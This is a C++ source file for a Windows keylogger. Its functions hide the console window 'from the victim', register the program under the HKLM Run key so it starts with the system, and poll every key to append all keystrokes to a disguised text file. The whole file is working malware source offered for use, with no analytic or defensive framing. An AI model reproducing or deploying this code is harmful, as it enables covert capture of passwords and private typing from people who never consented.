#include "keylogger.hpp"

/**
 *	References:
 *		https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 *		https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
 *		https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
 *		https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
 **/

// This function hides the keylogger console from the victim
void Keylogger::hideWindow() {
	AllocConsole();  //Allocate new console
	HWND hWnd;
	hWnd = FindWindowA("ConsoleWindowClass", NULL);    //Retreives a hanler for the specified window class name and window name(Tile).
	ShowWindow(hWnd, SW_HIDE);			  			   //This function hides the window by setting the second argument to SW_HIDE.
}

/**
 * Register the program in registry to run when the system is
 * turned on.
 * */
void Keylogger::regStartup(const char *progName) {
	//Get the current working directory
	char currentPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, currentPath);
	strcat(currentPath, progName);
	
	HKEY hKey;
	LONG uSucess = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,						//Register for all users on the system
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_WRITE | KEY_SET_VALUE,
		&hKey
	);
	if(uSucess == ERROR_SUCCESS) {
		RegSetValueEx(
			hKey,		
			progName,	// The application name
			0,			//reserved
			REG_SZ,
			reinterpret_cast<unsigned char*>(currentPath),
			strlen(currentPath)
		);
	}
	RegCloseKey(hKey);
}

bool Keylogger::isCapital() {
		if((GetKeyState(VK_CAPITAL) && 0x0001) != 0 || (GetKeyState(VK_SHIFT) & 0x8000))
				return true;
		return false;
}


bool Keylogger::isShiftKeyPressed() {
	if((GetKeyState(VK_SHIFT) & 0x8000))
		return true;
	return false;
}


// The function that performs the logic of logging the key strokes
void Keylogger::logKeyStrokes() {
	for(unsigned char vKey = 1; vKey <= 255; vKey++) {
		//Get the key state, whether a key is press up or down at the time of calling the function
		SHORT res = GetAsyncKeyState(vKey);
		if(res & 0x01) { //If the button was pressed down.
			std::string val { "" };
			if(vKey == VK_LBUTTON) 				 //Left mouse button
				 val = "[LBUTTON]";
			else if(vKey == VK_RBUTTON) 		 //Right mouse button
				val = "[RBUTTON]";
			else if(vKey == VK_MBUTTON) 		 //Middle mouse button
				val = "[MBUTTON]";
			else if(vKey == VK_BACK)  
				val = "[BACKSPACE]";
			else if(vKey == VK_TAB)				 
				val = "[TAB]";
			else if(vKey == VK_RETURN)			 
				val = "[ENTER]";
			else if(vKey == VK_LSHIFT)   		 
				val = "[LEFT SHIFT]";
			else if(vKey == VK_RSHIFT)			 
				val = "[RIGHT SHIFT]";
			else if(vKey == VK_SHIFT)
				val = "";
			else if(vKey == VK_LCONTROL)		 
				val = "[LEFT CTRL]";
			else if(vKey == VK_RCONTROL)		 
				val = "[RIGHT CTRL]";
			else if(vKey == VK_CONTROL)
				val = "";
			else if(vKey == VK_LMENU)			 
				val = "[LEFT ALT]";
			else if(vKey == VK_RMENU)			
				val = "[RIGHT ALT]";
			else if(vKey == VK_MENU)
				val = "";
			else if(vKey == VK_PAUSE)			 
				val = "[PAUSE]";
			else if(vKey == VK_CAPITAL)			 
				val = "[CAPS LOCK]";
			else if(vKey == VK_ESCAPE)			 
				val = "[ESCAPSE]";
			else if(vKey == VK_PRIOR)			 
				val = "[PAGE UP]";
			else if(vKey == VK_NEXT)			 
				val = "[PAGE DOWN]";
			else if(vKey == VK_END)				 
				val = "[END]";
			else if(vKey == VK_HOME)			 
				val = "[HOME]";
			else if(vKey == VK_LEFT)			 
				val = "[LEFT ARROW]";
			else if(vKey == VK_UP)
				val = "[UP ARROW]";
			else if(vKey == VK_RIGHT)
				val = "[RIGHT ARROW]";
			else if(vKey == VK_DOWN)
				val = "[DOWN ARROW]";
			else if(vKey == VK_SNAPSHOT)
				val = "[PRINT SCREEN]";
			else if(vKey == VK_INSERT)
				val = "[INS]";
			else if(vKey == VK_SELECT)
				val = "[SELECT]";
			else if(vKey == VK_PRINT)
				val = "[PRINT]";
			else if(vKey == VK_EXECUTE)
				val = "[EXECUTE]";
			else if(vKey == VK_HELP)
				val = "[HELP]";
			else if(vKey == VK_DELETE)
				val = "[DELETE]";
			else if(vKey == VK_SPACE)
				val = " ";
			else if((vKey >= 0x30 && vKey <= 0x39) ||
					(vKey >= 0x41 && vKey <= 0x5A)) {
				if(vKey >= 0x41 && vKey <= 0x5A)
					if(!Keylogger::isCapital())
						val = tolower(vKey);
					else
						val = toupper(vKey);
				else {
					if(Keylogger::isShiftKeyPressed()) {
						switch(vKey) {
							case 0x30:
								val = ")";
								break;
							case 0x31:
								val = "!";
								break;
							case 0x32:
								val = "@";
								break;
							case 0x33:
								val = "#";
								break;
							case 0x34:
								val = "$";
								break;
							case 0x35:
								val = "%";
								break;
							case 0x36:
								val = "^";
								break;
							case 0x37:
								val = "&";
								break;
							case 0x38:
								val = "*";
								break;
							case 0x39:
								val = "(";
								break;
							default:
								val = std::to_string(vKey);
								break;
						}
					}else
						val = vKey;
				}
			}
			else if(vKey == VK_LWIN)
				val = "[LEFT WIN]";
			else if(vKey == VK_RWIN)
				val = "[RIGHT WIN]";
			else if(vKey >= 0x60 && vKey <= 0x69)
				val = std::to_string(vKey - 96);
			else if(vKey == VK_MULTIPLY)
				val = "*";
			else if(vKey == VK_ADD)
				val = "+";
			else if(vKey == VK_SUBTRACT)
				val = "-";
			else if(vKey == VK_DECIMAL)
				val = ".";
			else if(vKey == VK_DIVIDE)
				val = "/";
			else if(vKey >= 0x70 && vKey <= 0x7B)
				val = "[F" + std::to_string(vKey - 111) + "]";
			else if(vKey == VK_NUMLOCK)
				val = "[NUMLOCK]";
			else if(vKey == VK_SCROLL)
				val = "[SCROLLOCK]";
			else if(vKey >= 0xBA && vKey <= 0xC0) { //0xBA-0xC0
				if(Keylogger::isShiftKeyPressed()) {
					switch(vKey) {
						case 0xBA:
							val = ":";
							break;
						case 0xBB:
							val = "+";
							break;
						case 0xBC:
							val = "<";
							break;
						case 0XBD:
							val = "_";
							break;
						case 0xBE:
							val = ">";
							break;
						case 0xBF:
							val = "?";
							break;
						case 0xC0:
							val = "~";
							break;
						default:
							val = std::to_string(vKey);
							break;
					}
				} else {
					switch(vKey) {
						case 0xBA:
							val = ";";
							break;
						case 0xBB:
							val = "=";
							break;
						case 0xBC:
							val = ",";
							break;
						case 0XBD:
							val = "-";
							break;
						case 0xBE:
							val = ".";
							break;
						case 0xBF:
							val = "/";
							break;
						case 0xC0:
							val = "`";
							break;
						default:
							val = std::to_string(vKey);
							break;
					}
				}
				
			} 
			else if(vKey >= 0xDB && vKey <= 0xDF) {
				if(Keylogger::isShiftKeyPressed()) {
					switch(vKey) {
						case 0xDB:
							val = "{";
							break;
						case 0xDC:
							val = "|";
							break;
						case 0xDD:
							val = "}";
							break;
						case 0xDE:
							val = "\"";
							break;
						default:
							val = std::to_string(vKey);
							break;
					}
				} else {
					switch(vKey) {
						case 0xDB:
							val = "[";
							break;
						case 0xDC:
							val = "\\";
							break;
						case 0xDD:
							val = "]";
							break;
						case 0xDE:
							val = "'";
							break;
						default:
							val = std::to_string(vKey);
							break;
					}
				}
			}
			else
				val = "[KEY " + std::to_string(vKey) + "]";
				//Log the keys in a file
			if(val != "") {
				std::ofstream log;
				log.open("AdyW389234lWQ.txt", std::ios::app);
				log << val << std::endl;
				log.flush();
				log.close();
			}
		}
	}
}
